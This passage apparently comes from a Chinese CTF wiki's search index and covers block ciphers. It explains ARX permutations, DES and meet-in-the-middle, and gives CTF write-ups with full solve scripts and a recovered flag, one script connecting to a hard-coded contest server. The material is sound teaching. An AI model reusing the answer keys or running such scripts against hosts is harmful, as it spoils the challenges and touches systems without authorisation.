</ul>"},{"location":"crypto/blockcipher/arx-operations/#_5","title":"\u9898\u76ee","text":""},{"location":"crypto/blockcipher/arx-operations/#2018-ctf-primitive","title":"2018 *ctf primitive","text":""},{"location":"crypto/blockcipher/arx-operations/#_6","title":"\u5206\u6790","text":"<p>\u672c\u9898\u8981\u6c42\u6211\u4eec\u7ec4\u5408\u4e00\u5b9a\u6570\u76ee\u4ee5\u5185\u7684 Add-Rotate-Xor \u8fd0\u7b97\uff0c\u4f7f\u5f97\u83b7\u5f97\u7684\u52a0\u5bc6\u7b97\u6cd5\u80fd\u591f\u5c06\u56fa\u5b9a\u660e\u6587\u52a0\u5bc6\u6210\u6307\u5b9a\u7684\u968f\u673a\u5bc6\u6587\uff0c\u5373\u901a\u8fc7\u57fa\u7840\u8fd0\u7b97\u6765\u6784\u5efa\u4efb\u610f\u7f6e\u6362\u51fd\u6570\u3002\u6210\u529f\u6784\u5efa 3 \u6b21\u4e4b\u540e\u5373\u53ef\u83b7\u5f97 flag\u3002</p>"},{"location":"crypto/blockcipher/arx-operations/#_7","title":"\u89e3\u9898\u601d\u8def","text":"<p>\u5bf9\u4e8e\u6a21 256 \u4e0b\u7684\u8fd0\u7b97\uff0c\u4e00\u79cd\u5178\u578b\u7684\u57fa\u4e8e ARX \u7684\u6362\u4f4d\u64cd\u4f5c\u53ef\u4ee5\u8868\u793a\u4e3a\u5982\u4e0b\u7ec4\u5408 <pre><code>RotateLeft_1(Add_255(RotateLeft_7(Add_2(x))))\n</code></pre></p> <p>\u4e0a\u8ff0\u51fd\u6570\u5bf9\u5e94\u4e86\u4e00\u4e2a\u5c06 254 \u548c 255 \u8fdb\u884c\u4ea4\u6362\uff0c\u540c\u65f6\u4fdd\u6301\u5176\u5b83\u6570\u5b57\u4e0d\u53d8\u7684\u7f6e\u6362\u8fd0\u7b97\u3002</p> <p>\u76f4\u89c9\u4e0a\u6765\u8bf4\uff0c\u7531\u4e8e\u5728\u7b2c\u4e00\u6b65\u7684\u6a21\u52a0 2 \u8fd0\u7b97\u4e2d\uff0c\u4ec5\u6709\u8f93\u5165\u4e3a 254\u3001255 \u65f6\u4f1a\u53d1\u751f\u8fdb\u4f4d\uff0c\u8be5\u7ec4\u5408\u51fd\u6570\u5f97\u4ee5\u533a\u522b\u5bf9\u5f85\u8fd9\u4e00\u60c5\u51b5\u3002</p> <p>\u5229\u7528\u4e0a\u8ff0\u539f\u5b50\u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u51fa\u4efb\u610f\u4e24\u4e2a\u6570\u5b57 <code>a,b</code> \u7684\u7f6e\u6362\uff0c\u7ed3\u5408 Xor \u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u51cf\u5c11\u6240\u9700\u7684\u57fa\u672c\u64cd\u4f5c\u6570\u76ee\uff0c\u4f7f\u5176\u6ee1\u8db3\u9898\u76ee\u7ed9\u51fa\u7684\u9650\u5236\u3002\u4e00\u79cd\u53ef\u80fd\u7684\u64cd\u4f5c\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <ol> <li>\u5bf9\u4e8e <code>a,b</code>\uff0c\u901a\u8fc7\u6a21\u52a0\u64cd\u4f5c\u4f7f\u5f97 <code>a</code> \u4e3a0</li> <li>\u901a\u8fc7\u53f3\u79fb\u4f7f\u5f97b\u7684\u6700\u4f4e\u4f4d\u4e3a 1</li> <li>\u82e5 <code>b</code> \u4e0d\u4e3a 1\uff0c\u8fdb\u884c <code>Xor 1, Add 255</code> \u64cd\u4f5c\uff0c\u4fdd\u6301 <code>a</code> \u4ecd\u7136\u4e3a0\uff0c\u540c\u65f6 <code>b</code> \u7684\u6570\u503c\u51cf\u5c0f</li> <li>\u91cd\u590d\u64cd\u4f5c2-3\u76f4\u81f3 <code>b</code> \u4e3a1</li> <li>\u8fdb\u884c <code>Add 254</code> \u53ca\u6362\u4f4d\u64cd\u4f5c\uff0c\u4ea4\u6362 <code>a,b</code></li> <li>\u5bf9\u4e8e\u6362\u4f4d\u4ee5\u5916\u7684\u6240\u6709\u64cd\u4f5c\uff0c\u52a0\u5165\u5bf9\u5e94\u7684\u9006\u8fd0\u7b97\uff0c\u786e\u4fdd <code>a,b</code> \u4ee5\u5916\u7684\u6570\u503c\u4e0d\u53d8</li> </ol> <p>\u5b8c\u6574\u7684\u89e3\u9898\u811a\u672c\u5982\u4e0b\uff1a</p> <pre><code>from pwn import *\nimport string\nfrom hashlib import sha256\n\n#context.log_level='debug'\ndef dopow():\n    chal = c.recvline()\n    post = chal[12:28]\n    tar = chal[33:-1]\n    c.recvuntil(':')\n    found = iters.bruteforce(lambda x:sha256(x+post).hexdigest()==tar, string.ascii_letters+string.digits, 4)\n    c.sendline(found)\n\n#c = remote('127.0.0.1',10001)\nc = remote('47.75.4.252',10001)\ndopow()\npt='GoodCipher'\n\ndef doswap(a,b):\n    if a==b:\n        return\n    if a&gt;b:\n        tmp=b\n        b=a\n        a=tmp\n    ans=[]\n    ans.append((0,256-a))\n    b-=a\n    a=0\n    while b!=1:\n        tmp=0\n        lo=1\n        while b&amp;lo==0:\n            lo&lt;&lt;=1\n            tmp+=1\n        if b==lo:\n            ans.append((1,8-tmp))\n            break\n        if tmp!=0:\n            ans.append((1,8-tmp))\n        b&gt;&gt;=tmp\n        ans.append((2,1))\n        b^=1\n        ans.append((0,255))\n        b-=1\n    ans.append((0,254))\n\n    for a,b in ans:\n        c.sendline('%d %d'%(a,b))\n        c.recvline()\n    for a,b in [(0,2),(1,7),(0,255),(1,1)]:\n        c.sendline('%d %d'%(a,b))\n        c.recvline()\n    for a,b in ans[::-1]:\n        if a==0:\n            c.sendline('%d %d'%(a,256-b))\n        elif a==1:\n            c.sendline('%d %d'%(a,8-b))\n        elif a==2:\n            c.sendline('%d %d'%(a,b))\n        c.recvline()\n\nfor i in range(3):\n    print i\n    m=range(256)\n    c.recvuntil('ciphertext is ')\n    ct=c.recvline().strip()\n    ct=ct.decode('hex')\n    assert len(ct)==10\n    for i in range(10):\n        a=ord(ct[i])\n        b=ord(pt[i])\n        #print m[a],b\n        doswap(m[a],b)\n        for j in range(256):\n            if m[j]==b:\n                m[j]=m[a]\n                m[a]=b\n                break\n    c.sendline('-1')\n\nc.recvuntil('Your flag here.\\n')\nprint c.recvline()\n</code></pre>"},{"location":"crypto/blockcipher/des/","title":"DES","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/blockcipher/des/#_1","title":"\u57fa\u672c\u4ecb\u7ecd","text":"<p>Data Encryption Standard(DES)\uff0c\u6570\u636e\u52a0\u5bc6\u6807\u51c6\uff0c\u662f\u5178\u578b\u7684\u5757\u52a0\u5bc6\uff0c\u5176\u57fa\u672c\u4fe1\u606f\u5982\u4e0b</p> <ul> <li>\u8f93\u5165 64 \u4f4d\u3002</li> <li>\u8f93\u51fa 64 \u4f4d\u3002</li> <li>\u5bc6\u94a5 64 \u4f4d\uff0c\u4f7f\u7528 64 \u4f4d\u5bc6\u94a5\u4e2d\u7684 56 \u4f4d\uff0c\u5269\u4f59\u7684 8 \u4f4d\u8981\u4e48\u4e22\u5f03\uff0c\u8981\u4e48\u4f5c\u4e3a\u5947\u5076\u6821\u9a8c\u4f4d\u3002</li> <li>Feistel \u8fed\u4ee3\u7ed3\u6784<ul> <li>\u660e\u6587\u7ecf\u8fc7 16 \u8f6e\u8fed\u4ee3\u5f97\u5230\u5bc6\u6587\u3002</li> <li>\u5bc6\u6587\u7ecf\u8fc7\u7c7b\u4f3c\u7684 16 \u8f6e\u8fed\u4ee3\u5f97\u5230\u660e\u6587\u3002</li> </ul> </li> </ul>"},{"location":"crypto/blockcipher/des/#_2","title":"\u57fa\u672c\u6d41\u7a0b","text":"<p>\u7ed9\u51fa\u4e00\u5f20\u7b80\u5355\u7684 DES \u6d41\u7a0b\u56fe \u3002</p> <p></p>"},{"location":"crypto/blockcipher/des/#_3","title":"\u52a0\u5bc6","text":"<p>\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4e00\u4e0b\u6bcf\u4e00\u8f6e\u7684\u52a0\u5bc6\u8fc7\u7a0b</p> <p>L_{i+1}=R_i</p> <p>R_{i+1}=L_i\\oplus F(R_i,K_i)</p> <p>\u90a3\u4e48\u5728\u6700\u540e\u7684 Permutation \u4e4b\u524d\uff0c\u5bf9\u5e94\u7684\u5bc6\u6587\u4e3a(R_{n+1},L_{n+1})\u3002</p>"},{"location":"crypto/blockcipher/des/#_4","title":"\u89e3\u5bc6","text":"<p>\u90a3\u4e48\u89e3\u5bc6\u5982\u4f55\u89e3\u5bc6\u5462\uff1f\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u628a\u5bc6\u6587\u5148\u8fdb\u884c\u9006\u7f6e\u6362\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5f97\u5230\u6700\u540e\u4e00\u8f6e\u7684\u8f93\u51fa\u3002\u6211\u4eec\u8fd9\u65f6\u8003\u8651\u6bcf\u4e00\u8f6e</p> <p>R_i=L_{i+1}</p> <p>L_i=R_{i+1}\\oplus F(L_{i+1},K_i)</p> <p>\u56e0\u6b64\uff0c(L_0,R_0) \u5c31\u662f\u52a0\u5bc6\u65f6\u7b2c\u4e00\u6b21\u7f6e\u6362\u540e\u7684\u660e\u6587\u3002\u6211\u4eec\u53ea\u9700\u8981\u518d\u6267\u884c\u9006\u7f6e\u6362\u5c31\u53ef\u4ee5\u83b7\u5f97\u660e\u6587\u4e86\u3002</p> <p>\u53ef\u4ee5\u770b\u51fa\uff0cDES \u52a0\u89e3\u5bc6\u4f7f\u7528\u540c\u4e00\u5957\u903b\u8f91\uff0c\u53ea\u662f\u5bc6\u94a5\u4f7f\u7528\u7684\u987a\u5e8f\u4e0d\u4e00\u81f4\u3002</p>"},{"location":"crypto/blockcipher/des/#_5","title":"\u6838\u5fc3\u90e8\u4ef6","text":"<p>DES \u4e2d\u7684\u6838\u5fc3\u90e8\u4ef6\u4e3b\u8981\u5305\u62ec\uff08\u8fd9\u91cc\u53ea\u7ed9\u51fa\u52a0\u5bc6\u8fc7\u7a0b\u7684\uff09</p> <ul> <li>\u521d\u59cb\u7f6e\u6362</li> <li>F \u51fd\u6570<ul> <li>E \u6269\u5c55\u51fd\u6570</li> <li>S \u76d2\uff0c\u8bbe\u8ba1\u6807\u51c6\u672a\u7ed9\u51fa\u3002</li> <li>P \u7f6e\u6362</li> </ul> </li> <li>\u6700\u540e\u7f6e\u6362</li> </ul> <p>\u5176\u4e2d F \u51fd\u6570\u5982\u4e0b</p> <p></p> <p>\u5982\u679c\u5bf9 DES \u66f4\u52a0\u611f\u5174\u8da3\uff0c\u53ef\u4ee5\u8fdb\u884c\u66f4\u52a0\u4ed4\u7ec6\u5730\u7814\u7a76\u3002\u6b22\u8fce\u63d0\u4f9b PR\u3002</p>"},{"location":"crypto/blockcipher/des/#_6","title":"\u884d\u751f","text":"<p>\u5728 DES \u7684\u57fa\u7840\u4e0a\uff0c\u884d\u751f\u4e86\u4ee5\u4e0b\u4e24\u79cd\u52a0\u5bc6\u65b9\u5f0f</p> <ul> <li>\u53cc\u91cd DES</li> <li>\u4e09\u79cd DES</li> </ul>"},{"location":"crypto/blockcipher/des/#des_1","title":"\u53cc\u91cd DES","text":"<p>\u53cc\u91cd DES \u4f7f\u7528\u4e24\u4e2a\u5bc6\u94a5\uff0c\u957f\u5ea6\u4e3a 112 \u6bd4\u7279\u3002\u52a0\u5bc6\u65b9\u5f0f\u5982\u4e0b</p> <p>C=E_{k2}(E_{k1}(P))</p> <p>\u4f46\u662f\u53cc\u91cd DES \u4e0d\u80fd\u62b5\u6297\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u4e24\u4e2a\u96c6\u5408</p> <p>I={E_{k1}(P)}</p> <p>J=D_{k2}(C)</p> <p>\u5373\u5206\u522b\u679a\u4e3e K1 \u548c K2 \u5206\u522b\u5bf9 P \u8fdb\u884c\u52a0\u5bc6\u548c\u5bf9 C \u8fdb\u884c\u89e3\u5bc6\u3002</p> <p>\u5728\u6211\u4eec\u5bf9 P \u8fdb\u884c\u52a0\u5bc6\u5b8c\u6bd5\u540e\uff0c\u53ef\u4ee5\u5bf9\u52a0\u5bc6\u7ed3\u679c\u8fdb\u884c\u6392\u5e8f\uff0c\u8fd9\u6837\u7684\u590d\u6742\u5ea6\u4e3a2^nlog(2^n)=O(n2^n)</p> <p>\u5f53\u6211\u4eec\u5bf9 C \u8fdb\u884c\u89e3\u5bc6\u65f6\uff0c\u53ef\u4ee5\u6bcf\u89e3\u5bc6\u4e00\u4e2a\uff0c\u5c31\u53bb\u5bf9\u5e94\u7684\u8868\u4e2d\u67e5\u8be2\u3002</p> <p>\u603b\u7684\u590d\u6742\u5ea6\u4e3a\u8fd8\u662fO(n2^n)\u3002</p>"},{"location":"crypto/blockcipher/des/#des_2","title":"\u4e09\u91cd DES","text":"<p>\u4e09\u91cd DES \u7684\u52a0\u89e3\u5bc6\u65b9\u5f0f\u5982\u4e0b</p> <p>C=E_{k3}(D_{k2}(E_{k1}(P)))</p> <p>P=D_{k1}(E_{k2}(D_{k3}(C)))</p> <p>\u5728\u9009\u62e9\u5bc6\u94a5\u65f6\uff0c\u53ef\u4ee5\u6709\u4e24\u79cd\u65b9\u6cd5</p> <ul> <li>3 \u4e2a\u4e0d\u540c\u7684\u5bc6\u94a5\uff0ck1\uff0ck2\uff0ck3 \u4e92\u76f8\u72ec\u7acb\uff0c\u4e00\u5171 168 \u6bd4\u7279\u3002</li> <li>2 \u4e2a\u4e0d\u540c\u7684\u5bc6\u94a5\uff0ck1 \u4e0e k2 \u72ec\u7acb\uff0ck3=k1\uff0c112 \u6bd4\u7279\u3002</li> </ul>"},{"location":"crypto/blockcipher/des/#_7","title":"\u653b\u51fb\u65b9\u6cd5","text":"<ul> <li>\u5dee\u5206\u653b\u51fb</li> <li>\u7ebf\u6027\u653b\u51fb</li> </ul>"},{"location":"crypto/blockcipher/des/#2018-n1ctf-n1es","title":"2018 N1CTF N1ES","text":"<p>\u57fa\u672c\u4ee3\u7801\u5982\u4e0b</p> <pre><code># -*- coding: utf-8 -*-\ndef round_add(a, b):\n    f = lambda x, y: x + y - 2 * (x &amp; y)\n    res = ''\n    for i in range(len(a)):\n        res += chr(f(ord(a[i]), ord(b[i])))\n    return res\n\ndef permutate(table, block):\n    return list(map(lambda x: block[x], table))\n\ndef string_to_bits(data):\n    data = [ord(c) for c in data]\n    l = len(data) * 8\n    result = [0] * l\n    pos = 0\n    for ch in data:\n        for i in range(0,8):\n            result[(pos&lt;&lt;3)+i] = (ch&gt;&gt;i) &amp; 1\n        pos += 1\n    return result\n\ns_box = [54, 132, 138, 83, 16, 73, 187, 84, 146, 30, 95, 21, 148, 63, 65, 189, 188, 151, 72, 161, 116, 63, 161, 91, 37, 24, 126, 107, 87, 30, 117, 185, 98, 90, 0, 42, 140, 70, 86, 0, 42, 150, 54, 22, 144, 153, 36, 90, 149, 54, 156, 8, 59, 40, 110, 56,1, 84, 103, 22, 65, 17, 190, 41, 99, 151, 119, 124, 68, 17, 166, 125, 95, 65, 105, 133, 49, 19, 138, 29, 110, 7, 81, 134, 70, 87, 180, 78, 175, 108, 26, 121, 74, 29, 68, 162, 142, 177, 143, 86, 129, 101, 117, 41, 57, 34, 177, 103, 61, 135, 191, 74, 69, 147, 90, 49, 135, 124, 106, 19, 8\n9, 38, 21, 41, 17, 155, 83, 38, 159, 179, 19, 157, 68, 105, 151, 166, 171, 122, 179, 114, 52, 183, 89, 107, 113, 65, 161, 141, 18, 121, 95, 4, 95, 101, 81, 156,\n 17, 190, 38, 84, 9, 171, 180, 59, 45, 15, 34, 89, 75, 164, 190, 140, 6, 41, 188, 77, 165, 105, 5, 107, 31, 183, 107, 141, 66, 63, 10, 9, 125, 50, 2, 153, 156, 162, 186, 76, 158, 153, 117, 9, 77, 156, 11, 145, 12, 169, 52, 57, 161, 7, 158, 110, 191, 43, 82, 186, 49, 102, 166, 31, 41, 5, 189, 27]\n\ndef generate(o):\n    k = permutate(s_box,o)\n    b = []\n    for i in range(0, len(k), 7):\n        b.append(k[i:i+7] + [1])\n    c = []\n    for i in range(32):\n        pos = 0\n        x = 0\n        for j in b[i]:\n            x += (j&lt;&lt;pos)\n            pos += 1\n        c.append((0x10001**x) % (0x7f))\n    return c\n\n\n\nclass N1ES:\n    def __init__(self, key):\n        if (len(key) != 24 or isinstance(key, bytes) == False ):\n            raise Exception(\"key must be 24 bytes long\")\n        self.key = key\n        self.gen_subkey()\n\n    def gen_subkey(self):\n        o = string_to_bits(self.key)\n        k = []\n        for i in range(8):\n            o = generate(o)\n            k.extend(o)\n            o = string_to_bits([chr(c) for c in o[0:24]])\n        self.Kn = []\n        for i in range(32):\n            self.Kn.append(map(chr, k[i * 8: i * 8 + 8]))\n        return\n\n    def encrypt(self, plaintext):\n        if (len(plaintext) % 16 != 0 or isinstance(plaintext, bytes) == False):\n            raise Exception(\"plaintext must be a multiple of 16 in length\")\n        res = ''\n        for i in range(len(plaintext) / 16):\n            block = plaintext[i * 16:(i + 1) * 16]\n            L = block[:8]\n            R = block[8:]\n            for round_cnt in range(32):\n                L, R = R, (round_add(L, self.Kn[round_cnt]))\n            L, R = R, L\n            res += L + R\n        return res\n</code></pre> <p>\u663e\u7136\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u89c6\u4e3a\u4e00\u4e2a Feistel \u52a0\u5bc6\u7684\u65b9\u5f0f\uff0c\u89e3\u5bc6\u51fd\u6570\u5982\u4e0b</p> <pre><code>    def decrypt(self,ciphertext):\n        res = ''\n        for i in range(len(ciphertext) / 16):\n            block = ciphertext[i * 16:(i + 1) * 16]\n            L = block[:8]\n            R = block[8:]\n            for round_cnt in range(32):\n                L, R =R, (round_add(L, self.Kn[31-round_cnt]))\n            L,R=R,L\n            res += L + R\n        return res\n</code></pre> <p>\u6700\u540e\u7ed3\u679c\u4e3a</p> <pre><code>\u279c  baby_N1ES cat challenge.py\nfrom N1ES import N1ES\nimport base64\nkey = \"wxy191iss00000000000cute\"\nn1es = N1ES(key)\nflag = \"N1CTF{*****************************************}\"\ncipher = n1es.encrypt(flag)\n#print base64.b64encode(cipher)  # HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx\ncipher = 'HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx'\ncipher = base64.b64decode(cipher)\nprint n1es.decrypt(cipher)\n\u279c  baby_N1ES python challenge.py\nN1CTF{F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/}\n</code></pre>"},{"location":"crypto/blockcipher/des/#2019-ciscn-part_des","title":"2019 CISCN  part_des","text":"<p>\u9898\u76ee\u53ea\u7ed9\u4e86\u4e00\u4e2a\u6587\u4ef6\uff1a</p> <pre><code>Round n part_encode-&gt; 0x92d915250119e12b\nKey map -&gt; 0xe0be661032d5f0b676f82095e4d67623628fe6d376363183aed373a60167af537b46abc2af53d97485591f5bd94b944a3f49d94897ea1f699d1cdc291f2d9d4a5c705f2cad89e938dbacaca15e10d8aeaed90236f0be2e954a8cf0bea6112e84\n</code></pre> <p>\u8003\u8651\u5230\u9898\u76ee\u540d\u4ee5\u53ca\u6570\u636e\u7279\u5f81\uff0c<code>Round n part_encode</code> \u4e3a\u6267\u884cn\u8f6edes\u7684\u4e2d\u95f4\u7ed3\u679c\uff0c<code>Key map</code> \u5e94\u4e3ades\u7684\u5b50\u5bc6\u94a5\uff0c\u8981\u8fd8\u539f\u51fa\u660e\u6587\u53ea\u9700\u8fdb\u884cn\u8f6edes\u52a0\u5bc6\u7684\u9006\u8fc7\u7a0b\u5373\u53ef\uff0c\u89e3\u5bc6\u65f6\u6ce8\u610f\u4ee5\u4e0b\u4e09\u70b9\u3002</p> <ul> <li>\u5b50\u5bc6\u94a5\u7684\u9009\u53d6\uff0c\u5bf9\u4e8e\u53ea\u8fdb\u884c\u4e86n\u8f6e\u7684\u52a0\u5bc6\u7ed3\u679c\uff0c\u89e3\u5bc6\u65f6\u5e94\u4f9d\u6b21\u4f7f\u7528\u5bc6\u94a5 n, n-1..., 1\u3002</li> <li>des \u6700\u540e\u4e00\u8f6e\u540e\u7684\u64cd\u4f5c\uff0c\u672a\u5b8c\u6210\u7684 des \u6ca1\u6709\u4ea4\u6362\u5de6\u53f3\u4e24\u90e8\u5206\u548c\u9006\u521d\u59cb\u7f6e\u6362\uff0c\u56e0\u6b64\u89e3\u5bc6\u65f6\u6211\u4eec\u5e94\u5148\u5bf9\u5bc6\u6587\u8fdb\u884c\u8fd9\u4e24\u6b65\u64cd\u4f5c\u3002</li> <li>n \u7684\u9009\u62e9\uff0c\u5728\u672c\u9898\u4e2d\uff0c\u6211\u4eec\u5e76\u4e0d\u77e5\u9053 n\uff0c\u4f46\u8fd9\u65e0\u5173\u7d27\u8981\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u6240\u6709\u53ef\u80fd\u7684\u53d6\u503c\uff080-15\uff09flag\u5e94\u4e3aascii\u5b57\u7b26\u4e32\u3002</li> </ul> \u89e3\u9898\u4ee3\u7801 <pre><code>kkk = 16\ndef bit_rot_left(lst, pos):\n    return lst[pos:] + lst[:pos]\n\nclass DES:\n    IP = [\n            58,50,42,34,26,18,10,2,60,52,44,36,28,20,12,4,\n            62,54,46,38,30,22,14,6,64,56,48,40,32,24,16,8,\n            57,49,41,33,25,17,9,1,59,51,43,35,27,19,11,3,\n            61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7\n        ]\n    IP_re = [\n            40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,\n            38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29,\n            36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,\n            34,2,42,10,50,18,58,26,33,1,41,9,49,17,57,25\n        ]\n    Pbox = [\n            16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,\n            2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25\n        ]\n    E = [\n            32,1,2,3,4,5,4,5,6,7,8,9,\n            8,9,10,11,12,13,12,13,14,15,16,17,\n            16,17,18,19,20,21,20,21,22,23,24,25,\n            24,25,26,27,28,29,28,29,30,31,32,1\n        ]\n    PC1 = [\n                57,49,41,33,25,17,9,1,58,50,42,34,26,18,\n                10,2,59,51,43,35,27,19,11,3,60,52,44,36,\n                63,55,47,39,31,23,15,7,62,54,46,38,30,22,\n                14,6,61,53,45,37,29,21,13,5,28,20,12,4\n        ]\n    PC2 = [\n            14,17,11,24,1,5,3,28,15,6,21,10,\n            23,19,12,4,26,8,16,7,27,20,13,2,\n            41,52,31,37,47,55,30,40,51,45,33,48,\n            44,49,39,56,34,53,46,42,50,36,29,32\n        ]\n    Sbox = [\n            [\n                [14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7],\n                [0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8],\n                [4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0],\n                [15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13],\n            ],\n            [\n                [15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10],\n                [3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5],\n                [0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15],\n                [13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9],\n            ],\n            [\n                [10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8],\n                [13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1],\n                [13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7],\n                [1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12],\n            ],\n            [\n                [7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15],\n                [13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9],\n                [10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4],\n                [3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14],\n            ],\n            [\n                [2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9],\n                [14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6],\n                [4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14],\n                [11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3],\n            ],\n            [\n                [12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11],\n                [10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8],\n                [9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6],\n                [4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13],\n            ],\n            [\n                [4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1],\n                [13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6],\n                [1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2],\n                [6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12],\n            ],\n            [\n                [13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7],\n                [1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2],\n                [7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8],\n                [2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11],\n            ]\n        ]\n    rout = [1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1]\n    def __init__(self):\n        self.subkey = [[[1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1], [1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1], [1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1], [1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0], [0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1], [0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0], [0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0], [1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0], [1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 